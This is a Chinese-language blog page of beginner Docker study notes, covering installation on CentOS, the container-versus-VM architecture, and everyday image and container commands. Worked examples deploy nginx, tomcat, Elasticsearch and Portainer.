<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Docker学习笔记 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Docker学习笔记</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-dark">
                    
                        
                    
                    <h3>
<a id="Docker_0"></a>Docker概述</h3> 
<p>类似集装箱隔离，</p> 
<p>jar — 容器（mysql,redis）----发布到仓库-----从仓库下载</p> 
<h4>
<a id="Docker_8"></a>Docker历史</h4> 
<p>2010年dotcloud公司成立</p> 
<p>2013 Docker开源</p> 
<p>2014年4月9日，Docker1.0发布</p> 
<p>在此之前都是用的虚拟机</p> 
<p>基于go语言开发</p> 
<h3>
<a id="Docker_24"></a>Docker安装</h3> 
<pre><code class="prism language-shell"><span class="token comment">#卸载旧版本</span>
yum remove docker <span class="token punctuation"></span>
                  docker-client <span class="token punctuation"></span>
                  docker-client-latest <span class="token punctuation"></span>
                  docker-common <span class="token punctuation"></span>
                  docker-latest <span class="token punctuation"></span>
                  docker-latest-logrotate <span class="token punctuation"></span>
                  docker-logrotate <span class="token punctuation"></span>
                  docker-engine
<span class="token comment">#需要的安装包</span>
yum <span class="token function">install</span> -y yum-utils
<span class="token comment">#设置镜像的仓库</span>
yum-config-manager <span class="token punctuation"></span>
    --add-repo <span class="token punctuation"></span>
    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo
<span class="token comment">#更新yum软件包索引</span>
yum makecache fast
<span class="token comment">#安装docker docker-ce社区版，ee企业版</span>
yum <span class="token function">install</span> docker-ce docker-ce-cli containerd.io
<span class="token comment">#启动docker</span>
systemctl start docker
<span class="token comment">#重启</span>
systemctl restart docker
<span class="token comment">#查看版本</span>
docker version
<span class="token comment">#运行hello-world</span>
docker run hello-world
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#查看镜像</span>
<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker images</span>
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
hello-world   latest    feb5d9fea6a5   <span class="token number">5</span> weeks ago   <span class="token number">13</span>.3kB
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#卸载docker</span>
yum remove docker-ce docker-ce-cli containerd.io
<span class="token comment">#删除资源</span>
<span class="token function">rm</span> -rf /var/lib/docker
<span class="token function">rm</span> -rf /var/lib/containerd
</code></pre> 
<h4>
<a id="helloworld_71"></a>回顾hello-world流程</h4> 
<p><img src="https://images2.imgbox.com/f2/7f/RISqIXS6_o.png" alt=""></p> 
<p><img src="https://images2.imgbox.com/3d/f6/oRQoWIEL_o.png" alt=""></p> 
<h4>
<a id="_79"></a>底层原理</h4> 
<ul>
<li> <p><strong>Docker是怎么工作的？</strong><br> Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访<br> 问！<br> Docker-Server接收到Docker-Client的指令，就会执行这个命令！</p> <p><img src="https://images2.imgbox.com/d4/a4/V7D3hl2C_o.png" alt=""></p> </li>
<li> <p><strong>为什么Docker比Vm快?</strong><br> 1、docker有着比虚拟机更少的抽象层。由于docker不需要Hypervisor实现硬件资源虚拟化,运行在<br> docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在<br> 效率上有明显优势。<br> 2、docker利用的是宿主机的内核,而不需要Guest OS。<br> GuestOS： VM（虚拟机）里的的系统（OS）;<br> HostOS：物理机里的系统（OS）；</p> </li>
</ul> 
<p><img src="https://images2.imgbox.com/9c/0b/NWHYfmCN_o.png" alt=""></p> 
<p>因此,当新建一个 容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。然而避免引导、加<br> 载操作系统内核是个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载GuestOS，返<br> 个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了这个复杂的过程，因此<br> 新建一个docker容器只需要几秒钟。</p> 
<h3>
<a id="Docker_105"></a>Docker的常用命令</h3> 
<h4>
<a id="_107"></a>帮助命令</h4> 
<pre><code class="prism language-shell">docker version
docker info
docker <span class="token operator">&lt;</span>命令<span class="token operator">&gt;</span> --help
</code></pre> 
<p>帮助文档</p> 
<h4>
<a id="_117"></a>镜像命令</h4> 
<pre><code class="prism language-shell"><span class="token comment">#查看镜像</span>
docker images
docker images -q
docker images -a

<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker images</span>
REPOSITORY    TAG       IMAGE ID       CREATED       SIZE
hello-world   latest    feb5d9fea6a5   <span class="token number">5</span> weeks ago   <span class="token number">13</span>.3kB

REPOSITORY 镜像仓库源
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#搜索镜像</span>
<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker search mysql</span>
NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
mysql                             MySQL is a widely used, open-source relation…   <span class="token number">11635</span>     <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>       
mariadb                           MariaDB Server is a high performing <span class="token function">open</span> sou…   <span class="token number">4429</span>      <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>       
mysql/mysql-server                Optimized MySQL Server Docker images. Create…   <span class="token number">863</span>                  <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
phpmyadmin                        phpMyAdmin - A web interface <span class="token keyword">for</span> MySQL and M…   <span class="token number">362</span>       <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>       
centos/mysql-57-centos7           MySQL <span class="token number">5.7</span> SQL database server                   <span class="token number">91</span>                   

<span class="token comment">#可选项，根据搜藏来过滤</span>
--filter<span class="token operator">=</span>STARS<span class="token operator">=</span><span class="token number">3000</span> 搜索出来的镜像就是STARS<span class="token operator">&gt;</span><span class="token number">3000</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#拉取镜像</span>
docker pull mysql<span class="token punctuation">[</span>:tag<span class="token punctuation">]</span>
tag版本号

<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker pull mysql</span>
Using default tag: latest <span class="token comment"># 如果不写tag，默认是latest</span>
latest: Pulling from library/mysql
b380bbd43752: Pull complete <span class="token comment"># 分层下载，docker image的核心 联合文件系统</span>
f23cbf2ecc5d: Pull complete 
30cfc6c29c0a: Pull complete 
b38609286cbe: Pull complete 
8211d9e66cd6: Pull complete 
2313f9eeca4a: Pull complete 
7eb487d00da0: Pull complete 
4d7421c8152e: Pull complete 
77f3d8811a28: Pull complete 
cce755338cba: Pull complete 
69b753046b9f: Pull complete 
b2e64b0ab53c: Pull complete 
Digest: sha256:6d7d4524463fe6e2b893ffc2b89543c81dec7ef82fb2020a1b27606666464d87<span class="token comment">#签名</span>
Status: Downloaded newer image <span class="token keyword">for</span> mysql:latest
docker.io/library/mysql:latest <span class="token comment">#真实地址</span>

docker pull mysql
<span class="token comment">#等价于</span>
docker pull mysql<span class="token punctuation">[</span>:latest<span class="token punctuation">]</span>


<span class="token comment">#版本更改时，分层不会下载重复的文件</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#删除镜像</span>
docker rmi -f mysql:5.7<span class="token comment">#容器名</span>
docker rmi -f 938b57d64674<span class="token comment">#容器ID</span>
docker rmi -f 容器ID 容器ID 容器ID 容器ID<span class="token punctuation">..</span>.<span class="token comment">#删除多个容器</span>
docker rmi -f <span class="token variable"><span class="token variable">$(</span>docker images -aq<span class="token variable">)</span></span><span class="token comment">#删除全部容器</span>
</code></pre> 
<h4>
<a id="_188"></a>容器命令</h4> 
<pre><code class="prism language-shell"><span class="token comment">#拉取一个镜像测试</span>
docker pull centos
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#新建容器并启动</span>
docker run <span class="token punctuation">[</span>可选参数<span class="token punctuation">]</span> image

<span class="token comment">#参数说明</span>
--name<span class="token operator">=</span><span class="token string">"Name"</span> 		容器名字
-d					后台方式运行
-it					交互方式运行，进入容器查看内容
-p					（小写）指定容器的端口
	-p ip:主机端口:容器端口
	-p 主机端口:容器端口
	-p 容器端口

-P					随机指定端口

<span class="token comment">#测试</span>
docker run -it centos /bin/bash   <span class="token comment"># 进入容器</span>
<span class="token builtin class-name">exit</span>   <span class="token comment"># 退出</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#列出所有运行的容器</span>
-a <span class="token comment">#列出当前正在运行的容器+带出历史运行过的容器</span>
-n<span class="token operator">=</span>? <span class="token comment">#显示最近</span>
-q <span class="token comment">#只显示id</span>

docker <span class="token function">ps</span>
docker <span class="token function">ps</span> -a <span class="token comment">#列出当前正在运行的容器+带出历史运行过的容器</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token builtin class-name">exit</span> <span class="token comment">#停止容器并退出</span>
ctrl + P + Q <span class="token comment">#容器不停止并退出</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#删除容器</span>
docker <span class="token function">rm</span> 容器id<span class="token comment">#删除指定容器，不能删除正在运行的容器，如果要强制删除加上-f</span>
docker <span class="token function">rm</span> -f <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span><span class="token comment">#删除全部容器</span>
docker <span class="token function">ps</span> -a -q<span class="token operator">|</span><span class="token function">xargs</span> docker <span class="token function">rm</span><span class="token comment">#删除全部容器</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#启动和停止容器</span>
docker start 容器id		<span class="token comment">#启动容器</span>
docker restart 容器id		<span class="token comment">#重启容器</span>
docker stop 容器id		<span class="token comment">#停止容器</span>
docker <span class="token function">kill</span> 容器id		<span class="token comment">#强制停止容器</span>
</code></pre> 
<h4>
<a id="_247"></a>常用其他命令</h4> 
<pre><code class="prism language-shell"><span class="token comment">#后台启动容器</span>
<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker run -d centos</span>
cb597e7918560bb7ed2b9e7d068061e49a040e7a090f037d54747e6e56263144
<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker ps</span>
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

<span class="token comment">#问题：发现centos停止了</span>
<span class="token comment">#原因：docker使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止容器启动后，发现自己没有提供服务，就会立刻停止</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#查看日志</span>
docker logs -f -t --tail 显示条数 容器id
docker logs -f -t 容器id
<span class="token comment">#自己编写脚本</span>
docker run -d centos /bin/sh -c <span class="token string">"while true;do echo kuangshen;sleep 1;done"</span>

<span class="token comment">#显示日志</span>
docker logs -f -t --tail <span class="token number">10</span> 06bea14ffa75
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#查看容器中的进程信息</span>
docker <span class="token function">top</span> 容器id

<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker top 06bea14ffa75</span>
<span class="token environment constant">UID</span>                 PID                 <span class="token environment constant">PPID</span>                C                   STIME               TTY                 TIME                CMD
root                <span class="token number">19496</span>               <span class="token number">19477</span>               <span class="token number">0</span>                   <span class="token number">21</span>:13               ?                   00:00:00            /bin/sh -c <span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> kuangshen<span class="token punctuation">;</span><span class="token function">sleep</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">done</span>
root                <span class="token number">20997</span>               <span class="token number">19496</span>               <span class="token number">0</span>                   <span class="token number">21</span>:18               ?                   00:00:00            /usr/bin/coreutils --coreutils-prog-shebang<span class="token operator">=</span>sleep /usr/bin/sleep <span class="token number">1</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#查看镜像的元数据</span>
docker inspect 容器id

<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker inspect 06bea14ffa75</span>
<span class="token punctuation">[</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token string">"Id"</span><span class="token builtin class-name">:</span> <span class="token string">"06bea14ffa75b860cdfe105f5045b1be83a6639eee9552ffc159ae01b401a5c4"</span>,
        <span class="token string">"Created"</span><span class="token builtin class-name">:</span> <span class="token string">"2021-11-07T13:13:56.785284074Z"</span>,
        <span class="token string">"Path"</span><span class="token builtin class-name">:</span> <span class="token string">"/bin/sh"</span>,
        <span class="token string">"Args"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
            <span class="token string">"-c"</span>,
            <span class="token string">"while true;do echo kuangshen;sleep 1;done"</span>
        <span class="token punctuation">]</span>,
        <span class="token string">"State"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{<!-- --></span>
            <span class="token string">"Status"</span><span class="token builtin class-name">:</span> <span class="token string">"running"</span>,
            <span class="token string">"Running"</span><span class="token builtin class-name">:</span> true,
            <span class="token string">"Paused"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Restarting"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"OOMKilled"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Dead"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Pid"</span><span class="token builtin class-name">:</span> <span class="token number">19496</span>,
            <span class="token string">"ExitCode"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,
            <span class="token string">"Error"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"StartedAt"</span><span class="token builtin class-name">:</span> <span class="token string">"2021-11-07T13:13:57.071684542Z"</span>,
            <span class="token string">"FinishedAt"</span><span class="token builtin class-name">:</span> <span class="token string">"0001-01-01T00:00:00Z"</span>
        <span class="token punctuation">}</span>,
        <span class="token string">"Image"</span><span class="token builtin class-name">:</span> <span class="token string">"sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6"</span>,
        <span class="token string">"ResolvConfPath"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/containers/06bea14ffa75b860cdfe105f5045b1be83a6639eee9552ffc159ae01b401a5c4/resolv.conf"</span>,
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#进入当前正在运行的容器</span>
<span class="token comment">#方式一：容器在后台运行时，进入容器</span>
docker <span class="token builtin class-name">exec</span> -it 容器id /bin/bash

<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker exec -it 06bea14ffa75 /bin/bash</span>
<span class="token punctuation">[</span>root@06bea14ffa75 /<span class="token punctuation">]</span><span class="token comment"># ps -ef </span>
<span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMD
root         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">13</span>:13 ?        00:00:00 /bin/sh -c <span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> kuangshen<span class="token punctuation">;</span><span class="token function">sleep</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">done</span>
root       <span class="token number">719</span>     <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">13</span>:25 pts/0    00:00:00 /bin/bash
root       <span class="token number">742</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">13</span>:25 ?        00:00:00 /usr/bin/coreutils --coreutils-prog-shebang<span class="token operator">=</span>sleep /usr/bin/sleep <span class="token number">1</span>
root       <span class="token number">743</span>   <span class="token number">719</span>  <span class="token number">0</span> <span class="token number">13</span>:25 pts/0    00:00:00 <span class="token function">ps</span> -ef

<span class="token comment">#方式二：容器在后台运行时，进入容器</span>
docker attach 容器id
正在执行当前的代码<span class="token punctuation">..</span>.
<span class="token comment">#区别</span>
docker <span class="token builtin class-name">exec</span>		<span class="token comment">#进入容器后开启一个新的终端</span>
docker attach	<span class="token comment">#进入容器正在执行的终端，不会启动新的进程</span>
</code></pre> 
<pre><code class="prism language-shell"><span class="token comment">#从容器拷贝文件到主机</span>
docker <span class="token function">cp</span> 容器id:容器内路径 目的主机路径

<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker ps</span>
CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS     NAMES
bad34ff90469   centos    <span class="token string">"/bin/bash"</span>   <span class="token number">31</span> seconds ago   Up <span class="token number">30</span> seconds             keen_einstein
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker attach bad34ff90469</span>
<span class="token punctuation">[</span>root@bad34ff90469 /<span class="token punctuation">]</span><span class="token comment"># cd /home/</span>
<span class="token punctuation">[</span>root@bad34ff90469 home<span class="token punctuation">]</span><span class="token comment"># ls</span>
<span class="token punctuation">[</span>root@bad34ff90469 home<span class="token punctuation">]</span><span class="token comment"># touch test.java</span>
<span class="token punctuation">[</span>root@bad34ff90469 home<span class="token punctuation">]</span><span class="token comment"># exit     </span>
<span class="token builtin class-name">exit</span>
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker ps</span>
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker cp bad34ff90469:/home/test.java /home</span>
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># ls</span>
lighthouse  redis  test.java  www

<span class="token comment">#拷贝是一个手动过程，未来可以使用-v卷的技术，可以实现自动同步</span>
</code></pre> 
<h4>
<a id="_355"></a>小结</h4> 
<p><img src="https://images2.imgbox.com/87/6f/XbwSiEAB_o.png" alt=""></p> 
<h4>
<a id="_359"></a>练习</h4> 
<blockquote> 
 <p>安装nginx</p> 
</blockquote> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker search nginx</span>
NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED
nginx                             Official build of Nginx.                        <span class="token number">15763</span>     <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>       
jwilder/nginx-proxy               Automated Nginx reverse proxy <span class="token keyword">for</span> docker con…   <span class="token number">2091</span>                 <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
richarvey/nginx-php-fpm           Container running Nginx + PHP-FPM capable of…   <span class="token number">818</span>                  <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
jc21/nginx-proxy-manager          Docker container <span class="token keyword">for</span> managing Nginx proxy ho…   <span class="token number">273</span>                  
linuxserver/nginx                 An Nginx container, brought to you by LinuxS…   <span class="token number">159</span>                  
tiangolo/nginx-rtmp               Docker image with Nginx using the nginx-rtmp…   <span class="token number">143</span>                  <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
jlesage/nginx-proxy-manager       Docker container <span class="token keyword">for</span> Nginx Proxy Manager        <span class="token number">143</span>                  <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
alfg/nginx-rtmp                   NGINX, nginx-rtmp-module and FFmpeg from sou…   <span class="token number">110</span>                  <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
jasonrivers/nginx-rtmp            Docker images to <span class="token function">host</span> RTMP streams using NGI…   <span class="token number">95</span>                   <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
nginxdemos/hello                  NGINX webserver that serves a simple page co…   <span class="token number">76</span>                   <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
privatebin/nginx-fpm-alpine       PrivateBin running on an Nginx, php-fpm <span class="token operator">&amp;</span> Al…   <span class="token number">60</span>                   <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
nginx/nginx-ingress               NGINX and  NGINX Plus Ingress Controllers fo…   <span class="token number">55</span>                   
nginxinc/nginx-unprivileged       Unprivileged NGINX Dockerfiles                  <span class="token number">54</span>                   
staticfloat/nginx-certbot         Opinionated setup <span class="token keyword">for</span> automatic TLS certs lo…   <span class="token number">25</span>                   <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
nginxproxy/nginx-proxy            Automated Nginx reverse proxy <span class="token keyword">for</span> docker con…   <span class="token number">24</span>                   
nginx/nginx-prometheus-exporter   NGINX Prometheus Exporter <span class="token keyword">for</span> NGINX and NGIN…   <span class="token number">22</span>                   
schmunk42/nginx-redirect          A very simple container to redirect HTTP tra…   <span class="token number">19</span>                   <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
centos/nginx-112-centos7          Platform <span class="token keyword">for</span> running nginx <span class="token number">1.12</span> or building …   <span class="token number">15</span>                   
centos/nginx-18-centos7           Platform <span class="token keyword">for</span> running nginx <span class="token number">1.8</span> or building n…   <span class="token number">13</span>                   
flashspys/nginx-static            Super Lightweight Nginx Image                   <span class="token number">11</span>                   <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
mailu/nginx                       Mailu nginx frontend                            <span class="token number">9</span>                    <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
webdevops/nginx                   Nginx container                                 <span class="token number">9</span>                    <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
sophos/nginx-vts-exporter         Simple server that scrapes Nginx vts stats a…   <span class="token number">7</span>                    <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
ansibleplaybookbundle/nginx-apb   An APB to deploy NGINX                          <span class="token number">3</span>                    <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
wodby/nginx                       Generic nginx                                   <span class="token number">1</span>                    <span class="token punctuation">[</span>OK<span class="token punctuation">]</span>
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker pull nginx</span>
Using default tag: latest
latest: Pulling from library/nginx
b380bbd43752: Pull complete 
fca7e12d1754: Pull complete 
745ab57616cb: Pull complete 
a4723e260b6f: Pull complete 
1c84ebdff681: Pull complete 
858292fd2e56: Pull complete 
Digest: sha256:644a70516a26004c97d0d85c7fe1d0c3a67ea8ab7ddf4aff193d9f301670cf36
Status: Downloaded newer image <span class="token keyword">for</span> nginx:latest
docker.io/library/nginx:latest
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker images</span>
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
nginx        latest    87a94228f133   <span class="token number">3</span> weeks ago   133MB
centos       latest    5d0da3dc9764   <span class="token number">7</span> weeks ago   231MB
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker run -d --name nginx01 -p 3344:80 nginx</span>
bd1dd8f51eb8efe2359ed1e21ede663f82fc22a630f83ef87a85f0b24aaa96e3
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># docker ps</span>
CONTAINER ID   IMAGE     COMMAND                  CREATED          STATUS          PORTS                                   NAMES
bd1dd8f51eb8   nginx     <span class="token string">"/docker-entrypoint.…"</span>   <span class="token number">3</span> seconds ago    Up <span class="token number">2</span> seconds    <span class="token number">0.0</span>.0.0:3344-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp, :::3344-<span class="token operator">&gt;</span><span class="token number">80</span>/tcp   nginx01
bad34ff90469   centos    <span class="token string">"/bin/bash"</span>              <span class="token number">33</span> minutes ago   Up <span class="token number">16</span> minutes                                           keen_einstein
<span class="token punctuation">[</span>root@VM-0-15-centos home<span class="token punctuation">]</span><span class="token comment"># curl localhost:3344</span>
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Welcome to nginx<span class="token operator">!</span><span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>style<span class="token operator">&gt;</span>
html <span class="token punctuation">{<!-- --></span> color-scheme: light dark<span class="token punctuation">;</span> <span class="token punctuation">}</span>
body <span class="token punctuation">{<!-- --></span> width: 35em<span class="token punctuation">;</span> margin: <span class="token number">0</span> auto<span class="token punctuation">;</span>
font-family: Tahoma, Verdana, Arial, sans-serif<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token operator">&lt;</span>/style<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>Welcome to nginx<span class="token operator">!</span><span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>
<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>For online documentation and support please refer to
<span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"http://nginx.org/"</span><span class="token operator">&gt;</span>nginx.org<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span>.<span class="token operator">&lt;</span>br/<span class="token operator">&gt;</span>
Commercial support is available at
<span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"http://nginx.com/"</span><span class="token operator">&gt;</span>nginx.com<span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span>.<span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token operator">&lt;</span>em<span class="token operator">&gt;</span>Thank you <span class="token keyword">for</span> using nginx.<span class="token operator">&lt;</span>/em<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>

docker run -d --name nginx01 -p <span class="token number">3344</span>:80 nginx<span class="token comment">#3344为主机端口号，80为容器端口号</span>

</code></pre> 
<blockquote> 
 <p>安装tomcat</p> 
</blockquote> 
<pre><code class="prism language-shell">docker run -it --rm tomcat:9.0 <span class="token comment">#一般用于测试，用完就删除</span>
docker run -d -p <span class="token number">3355</span>:8080 --name tomca01 tomcat
</code></pre> 
<blockquote> 
 <p>部署es+kibana</p> 
</blockquote> 
<pre><code class="prism language-shell"><span class="token comment">#由于es比较耗内存，执行这个命令会死机</span>
docker run -d --name elasticsearch -p <span class="token number">9200</span>:9200 -p <span class="token number">9300</span>:9300 -e <span class="token string">"discovery.type=single-node"</span> elasticsearch:7.6.2

<span class="token comment">#查看cpu，内存等状态</span>
docker stats
<span class="token comment">#限制内存</span>
docker run -d --name elasticsearch -p <span class="token number">9200</span>:9200 -p <span class="token number">9300</span>:9300 -e <span class="token string">"discovery.type=single-node"</span> -e <span class="token assign-left variable">ES_JAVA_OPTS</span><span class="token operator">=</span><span class="token string">"-Xms64m -Xmx512m"</span> elasticsearch:7.6.2

</code></pre> 
<blockquote> 
 <p>使用kibana连接es</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/1e/b8/Kzzcr57q_o.png" alt=""></p> 
<h4>
<a id="_470"></a>可视化</h4> 
<p>docker图形化界面管理工具，提供一个后台面板</p> 
<pre><code class="prism language-shell">docker run -d -p <span class="token number">8088</span>:9000 --restart<span class="token operator">=</span>always -v /var/run/docker.sock:/var/run/docker.sock --privileged<span class="token operator">=</span>true  portainer/portainer

</code></pre> 
<p>访问测试</p> 
<p>42.193.51.130:8088</p> 
<h4>
<a id="Commit_487"></a>Commit镜像</h4> 
<pre><code class="prism language-shell">docker commit
docker commit -m<span class="token operator">=</span><span class="token string">"提交的描述信息"</span> -a<span class="token operator">=</span><span class="token string">"作者"</span> 容器id 目标镜像名:TAG
</code></pre> 
<p>测试</p> 
<pre><code class="prism language-shell"><span class="token comment">#启动一个tomcat</span>
docker run -it -p <span class="token number">8081</span>:8080 tomcat
<span class="token comment">#复制webapps.dist到websapps</span>
<span class="token function">cp</span> -r webapps.dist/* webapps/
<span class="token comment">#提交镜像</span>
<span class="token punctuation">[</span>root@VM-0-15-centos ~<span class="token punctuation">]</span><span class="token comment"># docker commit -a="ghhgy" -m="add webapps app" e605cafee200 tomcat02:1.0</span>
sha256:2a9f9f5e81867c0be15d11b88200ba76e8876f26506bf20c38e562283268b396
